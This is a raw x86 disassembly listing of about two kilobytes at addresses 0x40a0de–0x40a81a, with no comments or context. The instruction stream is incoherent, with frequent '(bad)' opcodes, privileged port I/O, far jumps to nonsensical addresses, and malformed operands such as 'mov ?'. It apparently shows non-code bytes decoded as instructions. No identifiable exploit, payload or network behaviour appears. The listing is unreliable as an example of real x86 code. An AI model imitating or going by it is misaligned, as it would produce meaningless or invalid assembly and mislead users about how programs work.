  40a0de:	fnstcw WORD PTR [ecx-0x5a2248e4]
  40a0e4:	retf   
  40a0e5:	icebp  
  40a0e6:	dec    ecx
  40a0e7:	rcr    ebp,0x60
  40a0ea:	stc    
  40a0eb:	out    dx,al
  40a0ec:	dec    esi
  40a0ed:	xchg   esi,eax
  40a0ee:	jmp    0xfe014cfd
  40a0f3:	add    BYTE PTR [ebx+0x142e1b12],ch
  40a0f9:	dec    ebp
  40a0fa:	mov    esi,fs
  40a0fc:	scas   al,BYTE PTR es:[edi]
  40a0fd:	nop
  40a0fe:	(bad)  
  40a0ff:	aas    
  40a100:	or     al,0x2a
  40a102:	pop    esi
  40a103:	dec    ecx
  40a104:	aaa    
  40a105:	add    DWORD PTR [esp+edi*8+0x29],ebp
  40a109:	dec    edi
  40a10a:	inc    eax
  40a10b:	imul   ebx,edx,0xd0c7a078
  40a111:	out    0x62,al
  40a113:	sub    dl,0x94
  40a116:	jnp    0x40a09c
  40a118:	outs   dx,BYTE PTR ds:[esi]
  40a119:	jae    0x40a123
  40a11b:	out    0x3,al
  40a11d:	(bad)  
  40a11e:	hlt    
  40a11f:	lock xchg ebp,eax
  40a121:	and    esi,DWORD PTR [esi+0x21]
  40a124:	or     ebp,DWORD PTR [ecx]
  40a126:	jmp    0x40a106
  40a128:	sbb    DWORD PTR [ecx],ecx
  40a12a:	in     al,0x40
  40a12c:	pop    ecx
  40a12d:	xchg   esp,eax
  40a12e:	inc    eax
  40a12f:	or     bh,cl
  40a131:	sbb    al,0x92
  40a133:	sti    
  40a134:	adc    eax,0x8ebf5f22
  40a139:	repz daa 
  40a13b:	push   ecx
  40a13c:	shr    dl,cl
  40a13e:	jo     0x40a0dc
  40a140:	push   DWORD PTR [ebp+0x61]
  40a143:	sub    DWORD PTR [eax+0x6cdd88ec],edi
  40a149:	pop    es
  40a14a:	je     0x40a15f
  40a14c:	lahf   
  40a14d:	daa    
  40a14e:	jle    0x40a13a
  40a150:	imul   esi,DWORD PTR [esi-0x481e099f],0x79721362
  40a15a:	mov    ecx,0xbc5300a1
  40a15f:	in     al,dx
  40a160:	leave  
  40a161:	mov    esi,DWORD PTR [edi]
  40a163:	inc    edi
  40a164:	jb     0x40a115
  40a166:	xchg   edi,eax
  40a167:	adc    ah,ah
  40a169:	sbb    al,0xed
  40a16b:	(bad)  
  40a16c:	scas   al,BYTE PTR es:[edi]
  40a16d:	js     0x40a167
  40a16f:	imul   ecx,edi,0xa6b88375
  40a175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a176:	gs loop 0x40a126
  40a179:	xlat   BYTE PTR ds:[ebx]
  40a17a:	jmp    0x6b67:0x67957fde
  40a181:	cwde   
  40a182:	mov    esi,DWORD PTR [ebx]
  40a184:	sub    dh,0xaf
  40a187:	int    0x48
  40a189:	adc    esi,DWORD PTR [eax-0x2b]
  40a18c:	popa   
  40a18d:	push   ecx
  40a18e:	lods   al,BYTE PTR ds:[esi]
  40a18f:	mov    ebp,0xa5a79ec3
  40a194:	lods   al,BYTE PTR ds:[esi]
  40a195:	adc    eax,DWORD PTR [eax+esi*4+0x36b0b35b]
  40a19c:	xchg   DWORD PTR [ecx+ebp*4-0x364021b3],edx
  40a1a3:	pextrw ebx,mm5,0x8d
  40a1a7:	test   al,0x21
  40a1a9:	sub    al,0xa2
  40a1ab:	push   edi
  40a1ac:	inc    ebp
  40a1ad:	(bad)  
  40a1ae:	(bad)  
  40a1af:	stos   DWORD PTR es:[edi],eax
  40a1b0:	mov    BYTE PTR [ebp-0x7f],bh
  40a1b3:	sahf   
  40a1b4:	adc    DWORD PTR [ebx+0x59cf0ec],esp
  40a1ba:	inc    ecx
  40a1bb:	and    DWORD PTR [esi+0x78],eax
  40a1be:	out    dx,eax
  40a1bf:	outs   dx,BYTE PTR ds:[esi]
  40a1c0:	in     eax,0x8
  40a1c2:	mov    ecx,0xf3a8689e
  40a1c7:	and    eax,0x8de06315
  40a1cc:	mov    cl,BYTE PTR [ecx]
  40a1ce:	push   cs
  40a1cf:	cwde   
  40a1d0:	sub    ch,BYTE PTR [eax+0x21b38345]
  40a1d6:	and    al,0xba
  40a1d8:	inc    ebx
  40a1d9:	rcl    eax,0x25
  40a1dc:	inc    ecx
  40a1dd:	sbb    eax,0xce53cfae
  40a1e2:	imul   ebp,DWORD PTR [edi],0xffffff83
  40a1e5:	test   al,0x11
  40a1e7:	mov    al,0x2e
  40a1e9:	and    dl,bl
  40a1eb:	sub    BYTE PTR [ebx-0x3b],cl
  40a1ee:	je     0x40a187
  40a1f0:	push   esp
  40a1f1:	cbw    
  40a1f3:	mov    ds:0x4b2eea1d,eax
  40a1f8:	and    esi,esp
  40a1fa:	mov    WORD PTR [ecx],fs
  40a1fc:	xchg   esp,eax
  40a1fd:	dec    esi
  40a1fe:	jl     0x40a272
  40a200:	pop    es
  40a201:	ja     0x40a1d2
  40a203:	(bad)  
  40a204:	sub    DWORD PTR [eax+0x47c49c5],ebp
  40a20a:	ins    DWORD PTR es:[edi],dx
  40a20b:	loop   0x40a1eb
  40a20d:	ss xlat BYTE PTR gs:[ebx]
  40a210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a211:	out    0xe9,al
  40a213:	mov    dh,0xf2
  40a215:	jo     0x40a231
  40a217:	es dec esi
  40a219:	(bad)  
  40a21a:	call   0x87186d8c
  40a21f:	stc    
  40a220:	mov    eax,0x69e4343c
  40a225:	adc    BYTE PTR [ebx],ch
  40a227:	mov    dl,0xe2
  40a22a:	fwait
  40a22b:	lahf   
  40a22c:	jno    0x40a278
  40a22e:	js     0x40a24f
  40a230:	jle    0x40a293
  40a232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a233:	cli    
  40a234:	inc    edi
  40a235:	add    dl,BYTE PTR [esi-0x51]
  40a238:	nop
  40a239:	xchg   ebx,eax
  40a23a:	aas    
  40a23b:	in     al,dx
  40a23c:	enter  0xa54a,0xf6
  40a240:	btr    DWORD PTR cs:[eax-0x10a11eae],esp
  40a248:	jno    0x40a1f4
  40a24a:	ss xchg esi,eax
  40a24c:	xor    DWORD PTR [esi+ecx*1-0x15],ebx
  40a250:	outs   dx,BYTE PTR ds:[esi]
  40a251:	pop    edx
  40a252:	in     al,dx
  40a253:	or     dh,BYTE PTR [esi+0x26]
  40a256:	cs add eax,0xa81a573e
  40a25c:	mov    ?,WORD PTR [edi+0x12a000fa]
  40a262:	out    dx,al
  40a263:	dec    edi
  40a264:	or     eax,0x4a4de875
  40a269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a26a:	sbb    BYTE PTR [esi],cl
  40a26c:	shl    esp,cl
  40a26e:	mov    ah,0x1c
  40a270:	jns    0x40a21e
  40a272:	lods   al,BYTE PTR ds:[esi]
  40a273:	mov    ah,0xa5
  40a275:	clc    
  40a276:	sbb    BYTE PTR [esi+ebp*1],dh
  40a279:	pop    esi
  40a27a:	hlt    
  40a27b:	and    ch,BYTE PTR [edi-0x17]
  40a27e:	or     cl,bh
  40a280:	or     BYTE PTR [ebx+0x78],ch
  40a283:	retf   
  40a284:	inc    edx
  40a285:	test   BYTE PTR [ebx+0x3ac73bf6],dl
  40a28b:	sbb    al,0xe2
  40a28d:	cvtpi2ps xmm3,mm0
  40a290:	add    BYTE PTR [ebx+0x3],bh
  40a293:	pop    esi
  40a294:	jnp    0x40a299
  40a296:	ins    BYTE PTR es:[edi],dx
  40a297:	add    DWORD PTR [ebx+ebx*1],eax
  40a29a:	sbb    eax,0x56025c0a
  40a29f:	into   
  40a2a0:	pop    ebp
  40a2a1:	pop    esp
  40a2a2:	lock pop edi
  40a2a4:	jae    0x40a314
  40a2a6:	call   0x174f:0xbd2f90b0
  40a2ad:	loope  0x40a26d
  40a2af:	scas   eax,DWORD PTR es:[edi]
  40a2b0:	pop    edx
  40a2b1:	scas   al,BYTE PTR es:[edi]
  40a2b2:	mov    bl,0x6a
  40a2b4:	adc    al,0xed
  40a2b6:	aas    
  40a2b7:	lahf   
  40a2b8:	sahf   
  40a2b9:	outs   dx,DWORD PTR ds:[esi]
  40a2ba:	and    al,0x18
  40a2bc:	mov    esi,0x1932b246
  40a2c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2c2:	xchg   bl,al
  40a2c4:	sub    BYTE PTR [edx-0x10],ch
  40a2c7:	mov    ah,0xfc
  40a2c9:	int3   
  40a2ca:	pop    ebx
  40a2cb:	mov    WORD PTR ds:0xd11acb8b,ss
  40a2d1:	fwait
  40a2d2:	xor    ah,BYTE PTR [ebx+esi*1]
  40a2d5:	inc    edi
  40a2d6:	cs inc ebp
  40a2d8:	lock inc ebp
  40a2da:	aas    
  40a2db:	mov    WORD PTR [esi+edx*8],?
  40a2de:	repz stc 
  40a2e0:	enter  0xf2cd,0xf6
  40a2e4:	or     DWORD PTR [eax+ecx*4-0x291883ba],ebp
  40a2eb:	xchg   ecx,eax
  40a2ec:	or     al,0x1f
  40a2ee:	adc    eax,0xf9388066
  40a2f3:	retf   
  40a2f4:	out    0x96,ax
  40a2f7:	dec    edx
  40a2f8:	(bad)  
  40a2f9:	jnp    0x40a281
  40a2fb:	stc    
  40a2fc:	push   0xce32b910
  40a301:	inc    edi
  40a302:	xor    al,BYTE PTR [eax+0xa]
  40a305:	pop    eax
  40a306:	cmp    ch,BYTE PTR [ebx-0x34a8aab6]
  40a30c:	sbb    BYTE PTR [ecx+eiz*2],dl
  40a30f:	ss sub eax,0x5c20faf6
  40a315:	and    DWORD PTR [edx],ebp
  40a317:	jmp    0x8155:0x267f21e9
  40a31e:	xchg   esp,eax
  40a31f:	and    DWORD PTR [ebp+0x78],0xffffff8b
  40a323:	xor    al,0x35
  40a325:	imul   esp,esi,0x41871d7b
  40a32b:	sub    esi,ecx
  40a32d:	aaa    
  40a32e:	into   
  40a32f:	pop    ebp
  40a330:	aad    0xdd
  40a332:	loop   0x40a2e8
  40a334:	cs jecxz 0x40a314
  40a337:	pop    ebp
  40a338:	call   0x9728:0x3f380355
  40a33f:	cmp    edi,DWORD PTR [ecx+0x5e]
  40a342:	jne    0x40a36f
  40a344:	fldcw  WORD PTR [ecx+edi*8]
  40a347:	lds    ebp,FWORD PTR [ebx]
  40a349:	add    eax,0x1873b79c
  40a34e:	pushf  
  40a34f:	loopne 0x40a326
  40a351:	xor    ebx,eax
  40a353:	xchg   BYTE PTR [edx+0x22],ah
  40a356:	mov    esi,0x85c46a45
  40a35b:	or     eax,DWORD PTR [edi]
  40a35d:	into   
  40a35e:	sub    DWORD PTR [esp+esi*8],esi
  40a361:	mov    ah,0x8c
  40a363:	dec    esi
  40a364:	pop    ds
  40a365:	jnp    0x40a3a8
  40a367:	cli    
  40a368:	lock cld 
  40a36a:	loop   0x40a37a
  40a36c:	inc    ecx
  40a36d:	add    bl,BYTE PTR [edi+0x36]
  40a370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a371:	inc    eax
  40a372:	jae    0x40a33c
  40a374:	add    DWORD PTR [esi+0x5a105349],eax
  40a37a:	data16 mov bl,0xeb
  40a37d:	test   BYTE PTR [ebx],al
  40a37f:	inc    ecx
  40a380:	rol    bl,0xaa
  40a383:	pop    eax
  40a384:	cs cld 
  40a386:	in     eax,dx
  40a387:	popa   
  40a388:	jmp    0x40a3dc
  40a38a:	repz sub ebp,0xfdfb279a
  40a391:	dec    ah
  40a393:	pop    eax
  40a394:	jnp    0x40a373
  40a396:	xlat   BYTE PTR ds:[ebx]
  40a397:	ss mov edx,0x9fdbb72e
  40a39d:	jae    0x40a337
  40a39f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3a0:	adc    dh,0x2a
  40a3a3:	arpl   di,cx
  40a3a5:	aaa    
  40a3a6:	lahf   
  40a3a7:	or     eax,0x99917cdb
  40a3ac:	jno    0x40a379
  40a3ae:	loopne 0x40a340
  40a3b0:	cmp    eax,0xfba71d2c
  40a3b5:	mov    ebp,0x3a2bb973
  40a3ba:	stos   BYTE PTR es:[edi],al
  40a3bb:	mov    edx,0x433250cf
  40a3c0:	or     al,BYTE PTR [eax+0x34]
  40a3c3:	les    edx,FWORD PTR [ebp+eiz*8-0x15]
  40a3c7:	xchg   ebp,eax
  40a3c8:	push   0x12acc0ce
  40a3cd:	dec    ebx
  40a3ce:	imul   ebx,DWORD PTR [ebx],0xe060f522
  40a3d4:	call   0x47df1bfd
  40a3d9:	(bad)  
  40a3db:	jmp    0xdb53df07
  40a3e0:	ret    
  40a3e1:	and    al,bh
  40a3e3:	repz sub edi,DWORD PTR [edi]
  40a3e6:	xchg   ebp,eax
  40a3e7:	rol    al,1
  40a3e9:	or     DWORD PTR [edi+0x79a5f732],ebx
  40a3ef:	ins    DWORD PTR es:[edi],dx
  40a3f0:	test   BYTE PTR [ecx-0x159cd88e],al
  40a3f6:	test   ecx,0xa3acd150
  40a3fc:	mov    WORD PTR [ebp-0x6664d95],ss
  40a402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a403:	inc    eax
  40a404:	cld    
  40a405:	aas    
  40a406:	hlt    
  40a407:	ret    0x6b5
  40a40a:	jae    0x40a452
  40a40c:	sub    al,0xb9
  40a40e:	add    ch,bh
  40a410:	inc    edx
  40a411:	cmp    eax,0x8489814c
  40a416:	popf   
  40a417:	cmp    eax,0xb86b9b1
  40a41c:	cmp    DWORD PTR [ebp-0x4a2e0b43],edx
  40a422:	push   ebx
  40a424:	das    
  40a425:	call   0xea9e:0xfb4453e1
  40a42c:	outs   dx,BYTE PTR ds:[esi]
  40a42d:	pusha  
  40a42e:	adc    al,0x81
  40a430:	and    ch,dh
  40a432:	fiadd  WORD PTR ds:0xc61b84b4
  40a438:	add    DWORD PTR [edi-0x8],eax
  40a43b:	add    esp,DWORD PTR [esp+eiz*8+0x47]
  40a43f:	cmp    bl,BYTE PTR [esi-0x3c]
  40a442:	ja     0x40a474
  40a444:	and    BYTE PTR [ebp+0x1f23929c],bl
  40a44a:	pop    esi
  40a44b:	inc    eax
  40a44c:	mov    eax,ds:0x498075ec
  40a451:	push   cs
  40a452:	mov    BYTE PTR [ecx],bl
  40a454:	push   0xffffffd5
  40a456:	fisub  WORD PTR [ecx-0x11f89a06]
  40a45c:	or     al,0x9c
  40a45e:	adc    eax,0xeb14ed46
  40a463:	pop    eax
  40a464:	sub    esp,DWORD PTR [esi+eiz*2-0x209e7d5c]
  40a46b:	push   es
  40a46c:	or     al,bh
  40a46e:	fmul   DWORD PTR [edx+eiz*1+0x32554c3f]
  40a475:	sbb    DWORD PTR ds:0x2888087f,edx
  40a47b:	in     al,0x84
  40a47d:	pavgb  mm7,mm0
  40a480:	xor    al,0xcc
  40a482:	rol    BYTE PTR [edi-0x33],1
  40a485:	push   ss
  40a486:	jae    0x40a497
  40a488:	imul   ecx,DWORD PTR [esi+0x6f],0xffffffc4
  40a48c:	mov    ecx,DWORD PTR [eax-0x1d]
  40a48f:	jecxz  0x40a49f
  40a491:	xchg   BYTE PTR [edi+0xa],al
  40a494:	lods   eax,DWORD PTR ds:[esi]
  40a495:	or     eax,esp
  40a497:	push   0xa589f23f
  40a49c:	dec    edi
  40a49d:	call   0xfe92:0x25c285a6
  40a4a4:	fsubp  st(6),st
  40a4a6:	sub    BYTE PTR [ebx-0x7934be74],ah
  40a4ac:	les    ebp,FWORD PTR [edx+0x10]
  40a4af:	neg    DWORD PTR [ebp-0x21a72015]
  40a4b5:	mov    bh,0xf8
  40a4b7:	push   ebp
  40a4b8:	sti    
  40a4b9:	cmp    eax,0x20779857
  40a4be:	lods   al,BYTE PTR ds:[esi]
  40a4bf:	popa   
  40a4c0:	std    
  40a4c1:	les    eax,FWORD PTR [ecx]
  40a4c3:	sbb    al,0x7a
  40a4c5:	push   ss
  40a4c6:	mov    DWORD PTR [ecx+0x23a4ffef],eax
  40a4cc:	add    bh,BYTE PTR [ebx+0x11006f4]
  40a4d2:	mov    DWORD PTR [eax-0x6cf65b9f],ebp
  40a4d8:	(bad)  
  40a4d9:	push   ebx
  40a4da:	jmp    0xef9b9e6c
  40a4df:	pop    ebp
  40a4e0:	(bad)  
  40a4e1:	sbb    BYTE PTR [esi-0x2b21ac66],dh
  40a4e7:	inc    esp
  40a4e8:	sub    eax,0xdaa7f7c9
  40a4ed:	mov    esp,esi
  40a4ef:	xchg   esp,eax
  40a4f0:	inc    ebx
  40a4f1:	daa    
  40a4f2:	lea    ebp,[ebx+0x66]
  40a4f5:	pusha  
  40a4f6:	scas   eax,DWORD PTR es:[edi]
  40a4f7:	lahf   
  40a4f8:	gs es pushf 
  40a4fb:	jg     0x40a4ac
  40a4fd:	push   ebp
  40a4fe:	clc    
  40a4ff:	cmp    al,0x8c
  40a501:	mov    ebp,0xb1f8728
  40a506:	dec    ecx
  40a507:	call   0x6c4d097e
  40a50c:	lahf   
  40a50d:	dec    edx
  40a50e:	popa   
  40a50f:	or     DWORD PTR [edx+0x69],0xb
  40a513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a514:	dec    esi
  40a515:	sbb    BYTE PTR [ebp+0x18],0x25
  40a519:	pop    ecx
  40a51a:	cwde   
  40a51b:	mov    al,ds:0xa36ee7a3
  40a520:	lahf   
  40a521:	dec    edx
  40a522:	and    ch,BYTE PTR [eax+0x7735c6d9]
  40a528:	push   esi
  40a529:	sub    ebx,DWORD PTR [esi+0x7ff2836e]
  40a52f:	into   
  40a530:	sub    BYTE PTR [edi-0x4224aa73],0xce
  40a537:	and    DWORD PTR [ebx-0x7b],0x38
  40a53b:	mov    esi,0x4c0f6a2b
  40a540:	dec    edx
  40a541:	pop    esp
  40a542:	mov    esp,DWORD PTR [eax-0x697b5f3e]
  40a548:	cmp    edi,DWORD PTR [ecx-0x8]
  40a54b:	test   DWORD PTR [edi+0x28],esp
  40a54e:	adc    bh,al
  40a550:	xchg   esp,eax
  40a551:	or     dh,dl
  40a553:	aas    
  40a554:	jae    0x40a5aa
  40a556:	jbe    0x40a5c0
  40a558:	pop    es
  40a559:	stos   BYTE PTR es:[edi],al
  40a55a:	loopne 0x40a55a
  40a55c:	cmc    
  40a55d:	add    ebx,esp
  40a55f:	fiadd  DWORD PTR [ecx]
  40a561:	pop    edx
  40a562:	xchg   ecx,eax
  40a563:	or     DWORD PTR [ecx-0x60],eax
  40a566:	xchg   BYTE PTR [ebp-0x2d],bl
  40a569:	adc    bh,BYTE PTR [esi+edi*1-0x38]
  40a56d:	(bad)  
  40a56f:	xor    bl,BYTE PTR [edx]
  40a571:	cmc    
  40a572:	sbb    BYTE PTR [ebx+0x5b],ch
  40a575:	fild   DWORD PTR [edi]
  40a577:	lea    edi,[ecx+0x259ec437]
  40a57d:	sub    BYTE PTR [edx+0x2795f401],0x14
  40a584:	(bad)  
  40a585:	push   0xffffff84
  40a587:	sub    bl,BYTE PTR [eax+0x72]
  40a58a:	push   cs
  40a58b:	xor    DWORD PTR [edi],edx
  40a58d:	lock mov esi,DWORD PTR [ebx+0x62]
  40a591:	mov    esi,0x8944adb0
  40a596:	or     edx,DWORD PTR [edi]
  40a598:	aad    0x5
  40a59a:	es jnp 0x40a5da
  40a59d:	je     0x40a55b
  40a59f:	retf   0xc194
  40a5a2:	adc    BYTE PTR [eax+0x73],cl
  40a5a5:	into   
  40a5a6:	mov    ds:0xa86f7d9,eax
  40a5ab:	jbe    0x40a52f
  40a5ad:	aad    0x23
  40a5af:	and    eax,ecx
  40a5b1:	es aam 0x6a
  40a5b4:	gs sahf 
  40a5b6:	adc    edi,DWORD PTR [ebp-0x17]
  40a5b9:	mov    eax,cs
  40a5bb:	xor    al,0x4d
  40a5bd:	mov    eax,ds:0xcefc109a
  40a5c2:	out    dx,eax
  40a5c3:	xchg   ebp,eax
  40a5c4:	push   esi
  40a5c5:	dec    edi
  40a5c6:	mov    ah,0xba
  40a5c8:	iret   
  40a5c9:	ins    BYTE PTR es:[edi],dx
  40a5ca:	cmp    BYTE PTR [eax+0xb69890a],0x1f
  40a5d1:	pop    ds
  40a5d2:	or     ecx,ebx
  40a5d4:	jmp    0x40a610
  40a5d6:	and    DWORD PTR [esi+0x79],0x5f3af6d7
  40a5dd:	loope  0x40a5d9
  40a5df:	lods   al,BYTE PTR ds:[esi]
  40a5e0:	out    0x85,eax
  40a5e2:	pop    es
  40a5e3:	adc    DWORD PTR [ebx-0x75],eax
  40a5e6:	jae    0x40a5bf
  40a5e8:	mov    eax,0x54542f15
  40a5ed:	loopne 0x40a655
  40a5ef:	cmp    ch,BYTE PTR [edx-0x52]
  40a5f2:	bound  ebp,QWORD PTR [edx+0x19a0d0d4]
  40a5f8:	(bad)  
  40a5f9:	dec    edx
  40a5fa:	add    eax,eax
  40a5fc:	cs jp  0x40a5c9
  40a5ff:	cmc    
  40a600:	cmp    ebx,ebp
  40a602:	mov    BYTE PTR [eax],ch
  40a604:	inc    bp
  40a606:	add    DWORD PTR [ebx],0x4ddc4149
  40a60c:	lods   al,BYTE PTR ds:[esi]
  40a60d:	mov    al,0xb3
  40a60f:	stos   DWORD PTR es:[edi],eax
  40a610:	mov    eax,ds:0x4ef4ca7b
  40a615:	xor    edi,DWORD PTR [ebx-0x7a]
  40a618:	sahf   
  40a619:	lock push ds
  40a61b:	sti    
  40a61c:	out    0xb0,al
  40a61e:	mov    bl,0x91
  40a620:	xchg   ebx,eax
  40a621:	imul   ecx,DWORD PTR [eax+eax*4-0x65],0xc44abcd6
  40a629:	scas   eax,DWORD PTR es:[edi]
  40a62a:	sahf   
  40a62b:	xchg   ebx,eax
  40a62c:	or     ah,BYTE PTR [esi-0x32e30fb8]
  40a632:	mov    ds:0x5689df53,al
  40a637:	dec    esp
  40a638:	sbb    DWORD PTR [ebp+0x427ec9a0],edi
  40a63e:	test   al,0xe1
  40a640:	js     0x40a607
  40a642:	shr    BYTE PTR [edi-0x291c1ac0],0x6f
  40a649:	(bad)  
  40a64a:	xor    esp,DWORD PTR [ebp+0x5494caf0]
  40a650:	jmp    0x40a60d
  40a652:	popf   
  40a653:	out    0x82,eax
  40a655:	add    al,0x53
  40a657:	pop    es
  40a658:	fist   WORD PTR [ebx-0x37]
  40a65b:	mov    DWORD PTR [ebp-0x8],ebx
  40a65e:	fdivr  QWORD PTR [ecx+0x5d]
  40a661:	retf   
  40a662:	inc    ecx
  40a663:	in     eax,dx
  40a664:	pop    esp
  40a665:	lods   eax,DWORD PTR ds:[esi]
  40a666:	jp     0x40a64f
  40a668:	fdivr  st,st(2)
  40a66a:	das    
  40a66b:	sub    eax,0xd42d479b
  40a670:	jg     0x40a657
  40a672:	or     ebx,DWORD PTR ds:0x44c5630f
  40a678:	dec    eax
  40a679:	xor    bh,BYTE PTR [edi+ebp*8]
  40a67c:	sar    BYTE PTR [edx-0x7c],0xe4
  40a680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a681:	mov    edx,0xfd64711d
  40a686:	mov    fs,WORD PTR [edx]
  40a688:	ret    
  40a689:	push   edi
  40a68a:	cdq    
  40a68b:	ss jne 0x40a6e0
  40a68e:	push   es
  40a68f:	pop    esp
  40a690:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a692:	rol    BYTE PTR [eax+esi*2+0x3],0xdd
  40a697:	dec    ebx
  40a698:	ret    
  40a699:	sub    al,0x20
  40a69b:	shr    BYTE PTR [esp+ecx*8+0x7402eb5],0xcb
  40a6a3:	pushf  
  40a6a4:	jne    0x40a658
  40a6a6:	mov    ebx,0x14490950
  40a6ab:	repnz mov dh,0xb8
  40a6ae:	jmp    0x40a66c
  40a6b0:	inc    eax
  40a6b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6b2:	and    al,0xd7
  40a6b4:	ja     0x40a6ea
  40a6b6:	ret    
  40a6b7:	xchg   edi,eax
  40a6b8:	jle    0x40a680
  40a6ba:	ja     0x40a653
  40a6bc:	inc    edx
  40a6bd:	add    cl,cl
  40a6bf:	sub    esp,edx
  40a6c1:	hlt    
  40a6c2:	cmp    DWORD PTR [esi-0x6ec4b96b],eax
  40a6c8:	xor    ch,bh
  40a6ca:	retf   0x662d
  40a6cd:	pop    esp
  40a6ce:	lods   eax,DWORD PTR ds:[esi]
  40a6cf:	push   ebp
  40a6d0:	outs   dx,BYTE PTR ds:[esi]
  40a6d1:	push   ds
  40a6d2:	lea    esp,[ecx]
  40a6d4:	repnz mov cl,0xa8
  40a6d7:	xchg   ebx,eax
  40a6d8:	pop    esp
  40a6d9:	dec    ebp
  40a6da:	test   al,0x4e
  40a6dc:	gs push edx
  40a6de:	inc    ebx
  40a6df:	mov    ebx,0x37a7157f
  40a6e4:	ret    0xf0cf
  40a6e7:	adc    BYTE PTR [ebp-0x7],bh
  40a6ea:	je     0x40a6a5
  40a6ec:	adc    eax,0x4a35fdc
  40a6f1:	push   ds
  40a6f2:	not    BYTE PTR [eax]
  40a6f4:	aas    
  40a6f5:	xchg   esp,eax
  40a6f6:	jle    0x40a760
  40a6f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6f9:	dec    ecx
  40a6fa:	mov    bh,BYTE PTR [esp+edx*8+0x79821b38]
  40a701:	loop   0x40a739
  40a703:	adc    eax,0xe339ac7b
  40a708:	dec    edi
  40a709:	leave  
  40a70a:	popa   
  40a70b:	das    
  40a70c:	addr16 push es
  40a70e:	and    BYTE PTR [ecx],dl
  40a710:	stos   BYTE PTR es:[edi],al
  40a711:	test   DWORD PTR [esp+ebx*8-0x68],0x8fdce79a
  40a719:	pop    esi
  40a71a:	add    dh,BYTE PTR [edi]
  40a71c:	call   0x9e7834bd
  40a721:	pop    ebx
  40a722:	std    
  40a723:	fcmovbe st,st(3)
  40a725:	mov    WORD PTR [edi],fs
  40a727:	rcl    BYTE PTR [ebx-0x1ecdf26e],1
  40a72d:	cmp    al,0x5
  40a72f:	sahf   
  40a730:	cmp    eax,DWORD PTR [edx-0x42]
  40a733:	add    eax,0x77a6c42e
  40a738:	sahf   
  40a739:	test   bl,ch
  40a73b:	add    ah,BYTE PTR gs:[ecx+0xfae7a28]
  40a742:	and    ah,BYTE PTR [eax+eiz*8-0x4d]
  40a746:	sti    
  40a747:	mov    ch,0xa3
  40a749:	call   0x3eb27a16
  40a74e:	or     edi,DWORD PTR [eax-0x30]
  40a751:	pop    ebp
  40a752:	es push edi
  40a754:	mov    dl,0xa7
  40a756:	dec    esi
  40a757:	mov    ah,0x81
  40a759:	pop    es
  40a75a:	mov    ?,edx
  40a75c:	pop    ebx
  40a75d:	aaa    
  40a75e:	pop    ecx
  40a75f:	xor    BYTE PTR [ebp-0x5ac21cb9],0x5e
  40a766:	pop    eax
  40a767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a768:	pop    ebx
  40a769:	scas   eax,DWORD PTR es:[edi]
  40a76a:	and    al,0xe9
  40a76c:	sti    
  40a76d:	push   0xffffffac
  40a76f:	pop    ds
  40a770:	loope  0x40a7a0
  40a772:	mov    eax,0x72b0520d
  40a777:	clc    
  40a778:	pop    ecx
  40a779:	lods   al,BYTE PTR ds:[esi]
  40a77a:	mov    BYTE PTR ds:[ecx+0xc],dh
  40a77e:	jo     0x40a7a8
  40a780:	out    dx,eax
  40a781:	out    dx,eax
  40a782:	and    bl,al
  40a784:	adc    bh,BYTE PTR [ecx+0x4f]
  40a787:	mov    ebx,ecx
  40a789:	add    edx,DWORD PTR [edx]
  40a78b:	adc    eax,0xf77bccd1
  40a790:	inc    eax
  40a791:	inc    ecx
  40a792:	mov    edx,0x865422eb
  40a797:	inc    edx
  40a798:	sbb    BYTE PTR [ecx+0x558645c1],bh
  40a79e:	cmp    DWORD PTR [eax],eax
  40a7a0:	ret    0xad71
  40a7a3:	or     BYTE PTR [ebp+0x79c69a7b],0x23
  40a7aa:	jne    0x40a77c
  40a7ac:	xlat   BYTE PTR ds:[ebx]
  40a7ad:	jmp    0x7909b135
  40a7b2:	iret   
  40a7b3:	push   ebp
  40a7b4:	scas   eax,DWORD PTR es:[edi]
  40a7b5:	daa    
  40a7b6:	dec    ecx
  40a7b7:	xchg   esp,eax
  40a7b8:	fsubr  QWORD PTR [esi+0x43]
  40a7bb:	jnp    0x40a7bc
  40a7bd:	cld    
  40a7be:	mov    eax,ds:0xae214a00
  40a7c3:	sbb    ebp,DWORD PTR [edi-0x3c8f8172]
  40a7c9:	jecxz  0x40a846
  40a7cb:	cmc    
  40a7cc:	adc    ah,0xa5
  40a7cf:	mov    eax,0x499df011
  40a7d4:	mov    cl,0x28
  40a7d6:	test   BYTE PTR [ebx-0x49],dl
  40a7d9:	inc    ebp
  40a7da:	(bad)  
  40a7db:	(bad)  
  40a7dc:	lock mov al,0x5b
  40a7df:	inc    esp
  40a7e0:	test   DWORD PTR [edx],esi
  40a7e2:	daa    
  40a7e3:	add    al,bl
  40a7e5:	cmp    DWORD PTR [esi],ebx
  40a7e7:	jno    0x40a847
  40a7e9:	popa   
  40a7ea:	or     al,0xa6
  40a7ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7ed:	jns    0x40a7ed
  40a7ef:	ss lock ret 0x40ca
  40a7f4:	jno    0x40a7aa
  40a7f6:	adc    eax,0x5b10bf20
  40a7fb:	pop    esi
  40a7fc:	sub    BYTE PTR [ebp+0x51],ah
  40a7ff:	sar    BYTE PTR [ebx+0x31fea7c8],1
  40a805:	mov    BYTE PTR [edi+0x1839d635],ch
  40a80b:	cld    
  40a80c:	pop    esp
  40a80d:	mov    al,ds:0x4998319c
  40a812:	mov    al,0x9d
  40a814:	mov    al,0x88
  40a816:	xchg   edi,eax
  40a817:	xlat   BYTE PTR ds:[ebx]
  40a818:	xor    cl,cl
  40a81a:	mov    dl,al
